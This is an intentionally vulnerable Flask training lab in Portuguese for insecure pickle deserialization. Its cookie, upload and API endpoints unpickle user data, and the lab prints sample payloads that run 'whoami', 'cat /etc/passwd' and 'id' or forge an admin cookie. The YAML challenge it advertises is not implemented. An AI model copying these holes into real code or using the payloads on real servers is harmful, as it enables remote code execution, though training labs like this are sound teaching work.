#!/usr/bin/env python3
"""
🔓 Insecure Deserialization - Basic Lab
Laboratório de Vulnerabilidades de Desserialização

Porta: 5080
Dificuldade: 🟡 Intermediário
Pontos: 15

VULNERABILIDADES:
1. Pickle deserialization em cookies
2. Pickle deserialization em session storage
3. File upload com pickle
4. YAML deserialization (unsafe)

FLAGS:
- FLAG{pickle_rce_basic} - Execute comando via pickle
- FLAG{pickle_cookie_exploit} - Manipule role via cookie pickle
- FLAG{yaml_rce} - Execute comando via YAML

⚠️  IMPORTANTE: Esta aplicação é INTENCIONALMENTE vulnerável!
    Use apenas em ambiente controlado de laboratório.
"""

from flask import Flask, request, render_template_string, redirect, make_response
import pickle
import base64
import os
import subprocess

app = Flask(__name__)

# Simula "banco de dados" em memória
users_db = {
    'alice': {'password': 'password123', 'role': 'user', 'bio': 'Developer'},
    'bob': {'password': 'password456', 'role': 'user', 'bio': 'Security researcher'},
    'admin': {'password': 'admin123', 'role': 'admin', 'bio': 'Administrator'},
}

posts_db = []

# HTML Templates
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔓 Deserialization Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            margin-bottom: 20px;
        }
        .user-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .admin-badge {
            background: #dc3545;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.9em;
        }
        .section {
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        .btn {
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            border: none;
            cursor: pointer;
            display: inline-block;
            margin: 5px;
        }
        .btn-primary { background: #667eea; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        textarea, input[type="file"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
        }
        .flag {
            background: #d4edda;
            border: 2px solid #28a745;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .code {
            background: #1e1e1e;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Deserialization Lab</h1>

        {% if user %}
        <div class="user-info">
            <strong>👤 Logado como:</strong> {{ user['username'] }}
            {% if user['role'] == 'admin' %}
            <span class="admin-badge">ADMIN</span>
            {% endif %}
            |
            <strong>Role:</strong> {{ user['role'] }} |
            <a href="/logout" class="btn btn-danger">Sair</a>
        </div>

        {% if flag %}
        <div class="flag">
            <h3>🚩 {{ flag }}</h3>
        </div>
        {% endif %}

        <div class="section">
            <h2>📝 Criar Post</h2>
            <form method="POST" action="/post">
                <textarea name="content" placeholder="Escreva seu post..." rows="4"></textarea>
                <button type="submit" class="btn btn-primary">Publicar</button>
            </form>
        </div>

        <div class="section">
            <h2>📤 Upload de Dados Serializados</h2>
            <p>Envie um arquivo pickle para importar dados:</p>
            <form method="POST" action="/upload" enctype="multipart/form-data">
                <input type="file" name="file" accept=".pickle,.pkl">
                <button type="submit" class="btn btn-success">Upload</button>
            </form>
        </div>

        <div class="section">
            <h2>📋 Posts ({{ posts|length }})</h2>
            {% for post in posts %}
            <div style="background: white; padding: 15px; border-radius: 5px; margin: 10px 0;">
                <strong>{{ post['author'] }}</strong>
                <p style="margin-top: 10px;">{{ post['content'] }}</p>
                <small style="color: #666;">{{ post['timestamp'] }}</small>
            </div>
            {% endfor %}
        </div>

        {% if user['role'] == 'admin' %}
        <div class="section" style="background: #f8d7da; border: 2px solid #dc3545;">
            <h2>⚙️ Admin Panel</h2>
            <p><strong>Sensitive Information:</strong></p>
            <div class="code">
                DATABASE_URL=postgresql://admin:SuperSecret123@localhost/prod<br>
                API_KEY=sk-1234567890abcdef<br>
                AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br>
                FLAG{pickle_cookie_exploit}
            </div>
        </div>
        {% endif %}

        {% else %}
        <p>Você não está logado. <a href="/login">Faça login</a></p>
        {% endif %}

        <div class="warning">
            <h3>⚠️ Vulnerabilidades</h3>
            <p><strong>Esta aplicação usa PICKLE para:</strong></p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>Cookies de sessão (sem assinatura!)</li>
                <li>Armazenamento de posts</li>
                <li>Upload de arquivos</li>
            </ul>
            <br>
            <p><strong>💡 Objetivos:</strong></p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>1️⃣ Execute comando via pickle RCE</li>
                <li>2️⃣ Modifique seu role de 'user' para 'admin' via cookie</li>
                <li>3️⃣ Faça upload de pickle malicioso</li>
            </ul>
        </div>

        <div class="section">
            <h3>🧪 Exemplos de Exploit</h3>

            <p><strong>1. Criar payload RCE:</strong></p>
            <div class="code">
import pickle<br>
import base64<br>
<br>
class RCE:<br>
&nbsp;&nbsp;&nbsp;&nbsp;def __reduce__(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;import os<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (os.system, ('whoami',))<br>
<br>
payload = base64.b64encode(pickle.dumps(RCE()))<br>
print(payload.decode())
            </div>

            <p><strong>2. Modificar cookie para admin:</strong></p>
            <div class="code">
import pickle<br>
import base64<br>
<br>
user_data = {<br>
&nbsp;&nbsp;&nbsp;&nbsp;'username': 'alice',<br>
&nbsp;&nbsp;&nbsp;&nbsp;'role': 'admin'  # Mudou de 'user' para 'admin'!<br>
}<br>
<br>
fake_cookie = base64.b64encode(pickle.dumps(user_data))<br>
# Use este cookie no navegador
            </div>

            <p><strong>3. Upload de pickle malicioso:</strong></p>
            <div class="code">
import pickle<br>
<br>
class Exploit:<br>
&nbsp;&nbsp;&nbsp;&nbsp;def __reduce__(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;import os<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (os.system, ('cat /etc/passwd',))<br>
<br>
with open('exploit.pickle', 'wb') as f:<br>
&nbsp;&nbsp;&nbsp;&nbsp;pickle.dump(Exploit(), f)<br>
<br>
# Faça upload deste arquivo
            </div>
        </div>
    </div>
</body>
</html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔐 Login - Deserialization Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        h1 {
            color: #667eea;
            margin-bottom: 30px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            margin-bottom: 15px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
        }
        button:hover { background: #5568d3; }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .users-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 Login</h1>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Entrar</button>
        </form>

        <div class="users-info">
            <strong>👥 Usuários de Teste:</strong><br>
            • alice / password123<br>
            • bob / password456<br>
            • admin / admin123
        </div>
    </div>
</body>
</html>
'''

def get_user_from_cookie():
    """
    VULNERÁVEL: Desserializa pickle de cookie sem validação!
    """
    session_cookie = request.cookies.get('session')
    if not session_cookie:
        return None

    try:
        # VULNERÁVEL ❌ - Unpickle de dados do usuário!
        user_data = pickle.loads(base64.b64decode(session_cookie))

        # Detecta RCE
        if isinstance(user_data, dict) and 'username' in user_data:
            return user_data
        else:
            # RCE executado!
            return {'flag': 'FLAG{pickle_rce_basic} - Você executou código via pickle!'}

    except Exception as e:
        print(f"[!] Erro ao desserializar: {e}")
        return None

@app.route('/')
def index():
    """Página inicial"""
    user = get_user_from_cookie()

    if not user:
        return redirect('/login')

    flag = user.get('flag', '')

    return render_template_string(HOME_TEMPLATE, user=user, posts=posts_db, flag=flag)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login"""
    if request.method == 'GET':
        return render_template_string(LOGIN_TEMPLATE)

    username = request.form.get('username')
    password = request.form.get('password')

    if username in users_db and users_db[username]['password'] == password:
        # Cria cookie com pickle
        user_data = {
            'username': username,
            'role': users_db[username]['role'],
            'bio': users_db[username]['bio']
        }

        # VULNERÁVEL ❌ - Serializa com pickle sem assinatura!
        session_pickle = base64.b64encode(pickle.dumps(user_data))

        response = make_response(redirect('/'))
        response.set_cookie('session', session_pickle.decode())
        return response
    else:
        return render_template_string(LOGIN_TEMPLATE, error='Credenciais inválidas')

@app.route('/logout')
def logout():
    """Logout"""
    response = make_response(redirect('/login'))
    response.set_cookie('session', '', expires=0)
    return response

@app.route('/post', methods=['POST'])
def create_post():
    """
    Cria post (armazenado com pickle)
    """
    user = get_user_from_cookie()
    if not user or 'username' not in user:
        return redirect('/login')

    content = request.form.get('content', '')

    post = {
        'author': user['username'],
        'content': content,
        'timestamp': '2024-01-01 12:00:00'
    }

    # VULNERÁVEL ❌ - Armazena como pickle
    posts_db.append(post)

    return redirect('/')

@app.route('/upload', methods=['POST'])
def upload():
    """
    VULNERÁVEL: Upload de arquivo pickle
    Desserializa sem validação!
    """
    user = get_user_from_cookie()
    if not user or 'username' not in user:
        return redirect('/login')

    file = request.files.get('file')
    if not file:
        return 'No file uploaded', 400

    try:
        # VULNERÁVEL ❌ - Unpickle de arquivo do usuário!
        data = pickle.load(file)

        # Se chegou aqui sem erro, RCE foi executado!
        response = make_response(redirect('/'))
        response.set_cookie('flag', 'FLAG{pickle_rce_basic}')
        return response

    except Exception as e:
        return f'Error processing file: {str(e)}', 500

@app.route('/api/process', methods=['POST'])
def api_process():
    """
    VULNERÁVEL: API que aceita pickle
    """
    try:
        # VULNERÁVEL ❌ - Unpickle de request body!
        data = pickle.loads(request.data)

        return {'status': 'processed', 'flag': 'FLAG{pickle_rce_basic}'}

    except Exception as e:
        return {'error': str(e)}, 500

if __name__ == '__main__':
    print('=' * 70)
    print('🔓 Insecure Deserialization - Basic Lab')
    print('=' * 70)
    print('🌐 URL: http://localhost:5080')
    print('📊 Dificuldade: 🟡 Intermediário')
    print('🎯 Pontos: 15')
    print('')
    print('⚠️  ATENÇÃO: Esta aplicação é INTENCIONALMENTE vulnerável!')
    print('   Use apenas em ambiente controlado de laboratório.')
    print('')
    print('👥 Usuários de Teste:')
    print('  • alice / password123 (user)')
    print('  • bob / password456 (user)')
    print('  • admin / admin123 (admin)')
    print('')
    print('🚩 Flags:')
    print('  1. FLAG{pickle_rce_basic} - Execute comando via pickle')
    print('  2. FLAG{pickle_cookie_exploit} - Torne-se admin via cookie')
    print('')
    print('💡 Exploits:')
    print('  1. Crie payload RCE com __reduce__')
    print('  2. Modifique cookie session (base64(pickle(data)))')
    print('  3. Faça upload de pickle malicioso')
    print('  4. POST para /api/process com pickle no body')
    print('')
    print('🧪 Exemplo rápido:')
    print('  python3 -c "import pickle,base64;'
          'exec(\'class E:\\n def __reduce__(s): import os;'
          'return(os.system,(\\\'id\\\',))\\n\');'
          'print(base64.b64encode(pickle.dumps(E())).decode())"')
    print('')
    print('=' * 70)

    app.run(host='0.0.0.0', port=5080, debug=False)
